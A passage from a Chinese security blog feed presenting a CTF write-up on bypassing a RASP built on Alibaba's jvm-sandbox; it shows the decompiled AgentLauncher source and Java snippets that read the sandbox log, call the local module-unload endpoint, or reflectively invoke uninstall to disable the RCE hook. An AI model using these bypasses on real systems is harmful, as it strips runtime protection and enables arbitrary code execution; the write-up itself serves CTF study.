class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">KEY_PROPERTIES_FILE_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;prop&quot;</span>;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String OS;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AgentLauncher</span><span class="hljs-params">()</span> &#123;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxCfgPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;cfg&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxModulePath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;module&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxCoreJarPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;lib&quot;</span> + File.separator + <span class="hljs-string">&quot;sandbox-core.jar&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxSpyJarPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;lib&quot;</span> + File.separator + <span class="hljs-string">&quot;sandbox-spy.jar&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxPropertiesPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> getSandboxCfgPath(sandboxHome);  <br>        <span class="hljs-keyword">return</span> var10000 + File.separator + <span class="hljs-string">&quot;sandbox.properties&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxProviderPath</span><span class="hljs-params">(String sandboxHome)</span> &#123;  <br>        <span class="hljs-keyword">return</span> sandboxHome + File.separatorChar + <span class="hljs-string">&quot;provider&quot;</span>;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String featureString, Instrumentation inst)</span> &#123;  <br>        LAUNCH_MODE = <span class="hljs-string">&quot;agent&quot;</span>;  <br>        install(toFeatureMap(featureString), inst);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String featureString, Instrumentation inst)</span> &#123;  <br>        LAUNCH_MODE = <span class="hljs-string">&quot;attach&quot;</span>;  <br>        Map&lt;String, String&gt; featureMap = toFeatureMap(featureString);  <br>        writeAttachResult(getNamespace(featureMap), getToken(featureMap), install(featureMap, inst));  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeAttachResult</span><span class="hljs-params">(String namespace, String token, InetSocketAddress local)</span> &#123;  <br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(RESULT_FILE_PATH);  <br>        <span class="hljs-keyword">if</span> (!file.exists() || file.isFile() &amp;&amp; file.canWrite()) &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                <span class="hljs-type">FileWriter</span> <span class="hljs-variable">fw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(file, <span class="hljs-literal">true</span>);  <br><br>                <span class="hljs-keyword">try</span> &#123;  <br>                    fw.append(String.format(<span class="hljs-string">&quot;%s;%s;%s;%s\n&quot;</span>, namespace, token, local.getHostName(), local.getPort()));  <br>                    fw.flush();  <br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var8) &#123;  <br>                    <span class="hljs-keyword">try</span> &#123;  <br>                        fw.close();  <br>                    &#125; <span class="hljs-keyword">catch</span> (Throwable var7) &#123;  <br>                        var8.addSuppressed(var7);  <br>                    &#125;  <br><br>                    <span class="hljs-keyword">throw</span> var8;  <br>                &#125;  <br><br>                fw.close();  <br>            &#125; <span class="hljs-keyword">catch</span> (IOException var9) &#123;  <br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(var9);  <br>            &#125;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;write to result file : &quot;</span> + file + <span class="hljs-string">&quot; failed.&quot;</span>);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> ClassLoader <span class="hljs-title function_">loadOrDefineClassLoader</span><span class="hljs-params">(String namespace, String coreJar)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        SandboxClassLoader classLoader;  <br>        <span class="hljs-keyword">if</span> (sandboxClassLoaderMap.containsKey(namespace) &amp;&amp; <span class="hljs-literal">null</span> != sandboxClassLoaderMap.get(namespace)) &#123;  <br>            classLoader = (SandboxClassLoader)sandboxClassLoaderMap.get(namespace);  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            classLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SandboxClassLoader</span>(namespace, coreJar);  <br>            sandboxClassLoaderMap.put(namespace, classLoader);  <br>        &#125;  <br><br>        <span class="hljs-keyword">return</span> classLoader;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uninstall</span><span class="hljs-params">(String namespace)</span> <span class="hljs-keyword">throws</span> Throwable &#123;  <br>        <span class="hljs-type">SandboxClassLoader</span> <span class="hljs-variable">sandboxClassLoader</span> <span class="hljs-operator">=</span> (SandboxClassLoader)sandboxClassLoaderMap.get(namespace);  <br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != sandboxClassLoader) &#123;  <br>            Class&lt;?&gt; classOfProxyServer = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>);  <br>            classOfProxyServer.getMethod(<span class="hljs-string">&quot;destroy&quot;</span>).invoke(classOfProxyServer.getMethod(<span class="hljs-string">&quot;getInstance&quot;</span>).invoke((Object)<span class="hljs-literal">null</span>));  <br>            sandboxClassLoader.closeIfPossible();  <br>            sandboxClassLoaderMap.remove(namespace);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> InetSocketAddress <span class="hljs-title function_">install</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap, Instrumentation inst)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">namespace</span> <span class="hljs-operator">=</span> getNamespace(featureMap);  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">propertiesFilePath</span> <span class="hljs-operator">=</span> getPropertiesFilePath(featureMap);  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">coreFeatureString</span> <span class="hljs-operator">=</span> toFeatureString(featureMap);  <br><br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-type">String</span> <span class="hljs-variable">home</span> <span class="hljs-operator">=</span> getSandboxHome(featureMap);  <br>            inst.appendToBootstrapClassLoaderSearch(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JarFile</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(getSandboxSpyJarPath(home))));  <br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">sandboxClassLoader</span> <span class="hljs-operator">=</span> loadOrDefineClassLoader(namespace, getSandboxCoreJarPath(home));  <br>            Class&lt;?&gt; classOfConfigure = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.CoreConfigure&quot;</span>);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">objectOfCoreConfigure</span> <span class="hljs-operator">=</span> classOfConfigure.getMethod(<span class="hljs-string">&quot;toConfigure&quot;</span>, String.class, String.class).invoke((Object)<span class="hljs-literal">null</span>, coreFeatureString, propertiesFilePath);  <br>            Class&lt;?&gt; classOfProxyServer = sandboxClassLoader.loadClass(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.core.server.ProxyCoreServer&quot;</span>);  <br>            <span class="hljs-type">Object</span> <span class="hljs-variable">objectOfProxyServer</span> <span class="hljs-operator">=</span> classOfProxyServer.getMethod(<span class="hljs-string">&quot;getInstance&quot;</span>).invoke((Object)<span class="hljs-literal">null</span>);  <br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isBind</span> <span class="hljs-operator">=</span> (Boolean)classOfProxyServer.getMethod(<span class="hljs-string">&quot;isBind&quot;</span>).invoke(objectOfProxyServer);  <br>            <span class="hljs-keyword">if</span> (!isBind) &#123;  <br>                <span class="hljs-keyword">try</span> &#123;  <br>                    classOfProxyServer.getMethod(<span class="hljs-string">&quot;bind&quot;</span>, classOfConfigure, Instrumentation.class).invoke(objectOfProxyServer, objectOfCoreConfigure, inst);  <br>                &#125; <span class="hljs-keyword">catch</span> (Throwable var13) &#123;  <br>                    classOfProxyServer.getMethod(<span class="hljs-string">&quot;destroy&quot;</span>).invoke(objectOfProxyServer);  <br>                    <span class="hljs-keyword">throw</span> var13;  <br>                &#125;  <br>            &#125;  <br><br>            <span class="hljs-keyword">return</span> (InetSocketAddress)classOfProxyServer.getMethod(<span class="hljs-string">&quot;getLocal&quot;</span>).invoke(objectOfProxyServer);  <br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var14) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;sandbox attach failed.&quot;</span>, var14);  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isNotBlankString</span><span class="hljs-params">(String string)</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span> != string &amp;&amp; string.length() &gt; <span class="hljs-number">0</span> &amp;&amp; !string.matches(<span class="hljs-string">&quot;^\\s*$&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isBlankString</span><span class="hljs-params">(String string)</span> &#123;  <br>        <span class="hljs-keyword">return</span> !isNotBlankString(string);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getDefaultString</span><span class="hljs-params">(String string, String defaultString)</span> &#123;  <br>        <span class="hljs-keyword">return</span> isNotBlankString(string) ? string : defaultString;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;String, String&gt; <span class="hljs-title function_">toFeatureMap</span><span class="hljs-params">(String featureString)</span> &#123;  <br>        Map&lt;String, String&gt; featureMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>();  <br>        <span class="hljs-keyword">if</span> (isBlankString(featureString)) &#123;  <br>            <span class="hljs-keyword">return</span> featureMap;  <br>        &#125; <span class="hljs-keyword">else</span> &#123;  <br>            String[] kvPairSegmentArray = featureString.split(<span class="hljs-string">&quot;;&quot;</span>);  <br>            <span class="hljs-keyword">if</span> (kvPairSegmentArray.length == <span class="hljs-number">0</span>) &#123;  <br>                <span class="hljs-keyword">return</span> featureMap;  <br>            &#125; <span class="hljs-keyword">else</span> &#123;  <br>                String[] var3 = kvPairSegmentArray;  <br>                <span class="hljs-type">int</span> <span class="hljs-variable">var4</span> <span class="hljs-operator">=</span> kvPairSegmentArray.length;  <br><br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var5 &lt; var4; ++var5) &#123;  <br>                    <span class="hljs-type">String</span> <span class="hljs-variable">kvPairSegmentString</span> <span class="hljs-operator">=</span> var3[var5];  <br>                    <span class="hljs-keyword">if</span> (!isBlankString(kvPairSegmentString)) &#123;  <br>                        String[] kvSegmentArray = kvPairSegmentString.split(<span class="hljs-string">&quot;=&quot;</span>);  <br>                        <span class="hljs-keyword">if</span> (kvSegmentArray.length == <span class="hljs-number">2</span> &amp;&amp; !isBlankString(kvSegmentArray[<span class="hljs-number">0</span>]) &amp;&amp; !isBlankString(kvSegmentArray[<span class="hljs-number">1</span>])) &#123;  <br>                            featureMap.put(kvSegmentArray[<span class="hljs-number">0</span>], kvSegmentArray[<span class="hljs-number">1</span>]);  <br>                        &#125;  <br>                    &#125;  <br>                &#125;  <br><br>                <span class="hljs-keyword">return</span> featureMap;  <br>            &#125;  <br>        &#125;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getDefault</span><span class="hljs-params">(Map&lt;String, String&gt; map, String key, String defaultValue)</span> &#123;  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span> != map &amp;&amp; !map.isEmpty() ? getDefaultString((String)map.get(key), defaultValue) : defaultValue;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isWindows</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> OS.contains(<span class="hljs-string">&quot;win&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getSandboxHome</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">home</span> <span class="hljs-operator">=</span> getDefault(featureMap, <span class="hljs-string">&quot;home&quot;</span>, DEFAULT_SANDBOX_HOME);  <br>        <span class="hljs-keyword">if</span> (isWindows()) &#123;  <br>            <span class="hljs-type">Matcher</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> Pattern.compile(<span class="hljs-string">&quot;(?i)^[/\\\\]([a-z])[/\\\\]&quot;</span>).matcher(home);  <br>            <span class="hljs-keyword">if</span> (m.find()) &#123;  <br>                home = m.replaceFirst(<span class="hljs-string">&quot;$1:/&quot;</span>);  <br>            &#125;  <br>        &#125;  <br><br>        <span class="hljs-keyword">return</span> home;  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getNamespace</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;namespace&quot;</span>, <span class="hljs-string">&quot;default&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getToken</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;token&quot;</span>, <span class="hljs-string">&quot;&quot;</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getPropertiesFilePath</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-keyword">return</span> getDefault(featureMap, <span class="hljs-string">&quot;prop&quot;</span>, getSandboxPropertiesPath(getSandboxHome(featureMap)));  <br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">appendFromFeatureMap</span><span class="hljs-params">(StringBuilder featureSB, Map&lt;String, String&gt; featureMap, String key, String defaultValue)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (featureMap.containsKey(key)) &#123;  <br>            featureSB.append(String.format(<span class="hljs-string">&quot;%s=%s;&quot;</span>, key, getDefault(featureMap, key, defaultValue)));  <br>        &#125;  <br><br>    &#125;  <br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">toFeatureString</span><span class="hljs-params">(Map&lt;String, String&gt; featureMap)</span> &#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">sandboxHome</span> <span class="hljs-operator">=</span> getSandboxHome(featureMap);  <br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">featureSB</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(String.format(<span class="hljs-string">&quot;;cfg=%s;system_module=%s;mode=%s;sandbox_home=%s;user_module=%s;provider=%s;namespace=%s;&quot;</span>, getSandboxCfgPath(sandboxHome), getSandboxModulePath(sandboxHome), LAUNCH_MODE, sandboxHome, SANDBOX_USER_MODULE_PATH, getSandboxProviderPath(sandboxHome), getNamespace(featureMap)));  <br>        appendFromFeatureMap(featureSB, featureMap, <span class="hljs-string">&quot;server.ip&quot;</span>, <span class="hljs-string">&quot;0.0.0.0&quot;</span>);  <br>        appendFromFeatureMap(featureSB, featureMap, <span class="hljs-string">&quot;server.port&quot;</span>, <span class="hljs-string">&quot;0&quot;</span>);  <br>        <span class="hljs-keyword">return</span> featureSB.toString();  <br>    &#125;  <br><br>    <span class="hljs-keyword">static</span> &#123;  <br>        SANDBOX_USER_MODULE_PATH = DEFAULT_SANDBOX_HOME + File.separator + <span class="hljs-string">&quot;sandbox-module&quot;</span>;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">var10000</span> <span class="hljs-operator">=</span> System.getProperties().getProperty(<span class="hljs-string">&quot;user.home&quot;</span>);  <br>        RESULT_FILE_PATH = var10000 + File.separator + <span class="hljs-string">&quot;.sandbox.token&quot;</span>;  <br>        sandboxClassLoaderMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>();  <br>        OS = System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这个沙箱是阿里云的一个sandbox项目，项目地址：<a href="https://github.com/alibaba/jvm-sandbox">https://github.com/alibaba/jvm-sandbox</a></p><p>其中他是有一个卸载沙箱的操作的，这是官方给出的卸载命令</p><figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">./sandbox.sh -p 33342 -S<br>jvm-sandbox[default] shutdown finished.<br></code></pre></td></tr></table></figure><p>这题看了各个文章，他们的做法也都是直接卸载rasp沙箱来实现绕过，有段更详细的卸载操作在他的.sh脚本文件里面，我们可以直接将他的脚本粘贴过去问一下gpt它是如何卸载的</p><p><img src="https://cdn.clown2024.cn/image-20241111220208835.png" alt="image-20241111220208835"></p><p>这里有个-u可以卸载指定模块</p><p>它里面的具体操作是调用一个<code>sandbox_curl_with_exit</code>函数发起请求到沙箱服务器来执行卸载模块的操作，官方脚本示例如下</p><p><img src="https://cdn.clown2024.cn/image-20241111222729536.png" alt="image-20241111222729536"></p><p>那么我们就可以通过直接请求对应的url来进行模块的卸载，那么rasp监听的是哪个端口呢，这个我们去看rasp的log就能知道了</p><p>查看日志</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>            java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;file:///home/ctf/logs/sandbox/sandbox.log&quot;</span>);<br>            java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> url.openStream();<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>            bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[inputStream.available()];<br>            inputStream.read(bytes);<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes));<br>            System.out.println(java.util.Base64.getEncoder().encodeToString(bytes));<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            System.out.println(<span class="hljs-string">&quot;error&quot;</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><p>那么我们就可以写一个请求代码去请求本地的rasp接口然后卸载模块：<a href="http://127.0.0.1:port/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&ids=rasp-rce-native-hook">http://127.0.0.1:port/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&amp;ids=rasp-rce-native-hook</a></p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            url = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL(<span class="hljs-string">&quot;http://127.0.0.1:&lt;port&gt;/sandbox/default/module/http/sandbox-module-mgr/unload?action=unload&amp;ids=rasp-rce-native-hook&quot;</span>);<br>            java.net.<span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> (java.net.HttpURLConnection) url.openConnection();<br>            connection.setRequestMethod(<span class="hljs-string">&quot;GET&quot;</span>);<br>            connection.setUseCaches(<span class="hljs-literal">false</span>);<br>            connection.setConnectTimeout(<span class="hljs-number">5000</span>); <span class="hljs-comment">// 5 seconds</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> connection.getResponseCode();<br>            java.lang.System.out.println(<span class="hljs-string">&quot;Response Code : &quot;</span> + responseCode);<br>            <span class="hljs-keyword">if</span> (responseCode == java.net.HttpURLConnection.HTTP_OK) &#123;<br>                java.io.<span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> connection.getInputStream();<br>                java.io.<span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">inputStreamReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InputStreamReader(inputStream);<br>                java.io.<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.BufferedReader(inputStreamReader);<br><br>                java.lang.String output;<br>                java.lang.<span class="hljs-type">StringBuffer</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.StringBuffer();<br>                <span class="hljs-keyword">while</span> ((output = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                    response.append(output);<br>                &#125;<br>                bufferedReader.close();<br>                inputStreamReader.close();<br>                inputStream.close();<br>                connection.disconnect();<br>                java.lang.System.out.println(<span class="hljs-string">&quot;Response Body: &quot;</span> + response.toString());<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                java.lang.System.out.println(<span class="hljs-string">&quot;Request failed!&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (java.net.MalformedURLException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><p>然后就可以执行任意代码了，至于我们需要卸载的模块名称在日志里面也是能看到的，日志的路径也可以在项目的logback.xml中看到</p><p><img src="https://cdn.clown2024.cn/image-20241111223601498.png" alt="image-20241111223601498"></p><p>卸载完之后就能执行任意代码了</p><p><strong>直接调用uninstall来卸载模块</strong></p><p>还可以直接根据前面的源码知道他又uninstall方法可以用来卸载模块，就可以直接写恶意代码来卸载模块</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">// 使用类加载器动态加载 AgentLauncher 类</span><br>            Class&lt;?&gt; agentLauncherClass = Class.forName(<span class="hljs-string">&quot;com.alibaba.jvm.sandbox.agent.AgentLauncher&quot;</span>);<br><br>            <span class="hljs-comment">// 获取 uninstall 方法</span><br>System.out.println(agentLauncherClass);<br><span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span>Thread.currentThread().getStackTrace()[<span class="hljs-number">1</span>].getClassName();<br>System.out.println(<span class="hljs-string">&quot;当前类名: &quot;</span> + className);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">uninstallMethod</span> <span class="hljs-operator">=</span> agentLauncherClass.getDeclaredMethod(<span class="hljs-string">&quot;uninstall&quot;</span>, String.class);<br><br>uninstallMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;default&quot;</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Sandbox 卸载成功！&quot;</span>);<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;调用卸载方法时出错: &quot;</span> + e.getMessage());<br>            e.printStackTrace();<br>        &#125;<br></code></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://aiwin.fun/index.php/archives/4389/">https://aiwin.fun/index.php/archives/4389/</a></p><p><a href="https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md">https://www.bookstack.cn/read/anbai-inc-javaweb-sec/javase-CommandExecution-README.md</a></p><p><a href="https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP.html">https://dummykitty.github.io/java/2023/06/15/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP.html</a></p><p><strong>强网拟态的文章</strong></p><p><a href="https://xz.aliyun.com/t/15907?time__1311=GqjxcD2DuDRDyGDlxGo+CfoY5D=eQh4he+D">https://xz.aliyun.com/t/15907?time__1311=GqjxcD2DuDRDyGDlxGo%2BCfoY5D%3DeQh4he%2BD</a></p><p><a href="https://blog.potatowo.top/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024Web-Writeup">https://blog.potatowo.top/2024/10/21/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812024Web-Writeup</a></p><p><a href="https://blog.wm-team.cn/index.php/archives/84">https://blog.wm-team.cn/index.php/archives/84</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;rasp介绍&quot;&gt;&lt;a href=&quot;#RASP介绍&quot; class=&quot;headerlink&quot; title=&quot;RASP介绍&quot;&gt;&lt;/a&gt;RASP介绍&lt;/h1&gt;&lt;p&gt;RASP全称是Runtime applicaion self-protection，在2014念提出的一种应</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>XStream反序列化</title>
    <link href="https://clowsman.github.io/2024/11/04/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/11/04/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-11-03T16:13:50.000Z</published>
    <updated>2024-11-06T07:41:39.449Z</updated>
    
